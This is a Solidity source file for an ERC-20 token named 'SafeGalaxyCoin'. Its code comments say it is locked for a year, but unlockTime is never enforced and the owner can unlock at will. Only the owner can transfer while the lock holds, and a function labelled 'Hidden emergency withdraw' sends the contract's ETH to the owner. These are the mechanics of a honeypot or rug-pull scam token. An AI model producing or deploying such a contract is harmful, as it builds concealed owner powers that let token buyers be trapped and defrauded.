pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SafeGalaxyCoin is ERC20, Ownable {

    bool public locked;
    uint256 public unlockTime;

    constructor() ERC20("SafeGalaxyCoin", "SGC") {
        _mint(msg.sender, 1000000 * 10**decimals()); // Initial mint
        locked = true;
        unlockTime = block.timestamp + 365 days; // Lock for 1 year
    }

    function unlock() public onlyOwner {
        locked = false;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(!locked || from == owner(), "Transfer locked");
        super._transfer(from, to, amount);
    }

    // Hidden emergency withdraw function
    function emergencyWithdraw() public onlyOwner {
        require(address(this).balance > 0, "No funds to withdraw");
        payable(owner()).transfer(address(this).balance);
    }
}
```

